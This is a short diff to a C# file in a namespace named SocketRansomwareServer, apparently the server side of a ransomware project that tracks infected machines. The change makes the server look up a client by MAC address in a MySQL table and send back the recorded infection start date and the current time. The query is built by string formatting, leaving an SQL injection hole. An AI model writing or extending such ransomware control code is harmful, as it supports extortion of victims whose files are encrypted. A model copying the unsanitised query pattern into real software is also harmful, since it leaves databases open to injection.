@@ -99,16 +99,18 @@ namespace SocketRansomwareServer
                 _mac = mac;
                 try
                 {
-                    using (DB.Instance._connection)
-                    {
+                  //  using (DB.Instance._connection)
+                  //  {
                         string query = string.Format("select * from client where mac = '{0}'", mac);
                         MySqlCommand command = new MySqlCommand(query, DB.Instance._connection);
                         MySqlDataReader table = command.ExecuteReader();
                         
                         if(table.HasRows)
                         {
-                            Console.WriteLine($"이미 존재, {table["start_date"]}");
-
+                            table.Read();
+                            //Console.WriteLine($"이미 존재, {table.GetString("start_date")}");
+                            string start_date = table.GetDateTime("start_date").ToString("yyyy-MM-dd HH:mm:ss");
+                            SendDataClient("timestamp;infection;"+start_date+";current;"+DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
                             table.Close();
                             
                         } else
@@ -135,7 +137,7 @@ namespace SocketRansomwareServer
 
                             }
                             else Console.WriteLine("DB 저장 실패");
-                        }
+                       // }
                         
                     }
                 } catch(Exception e)
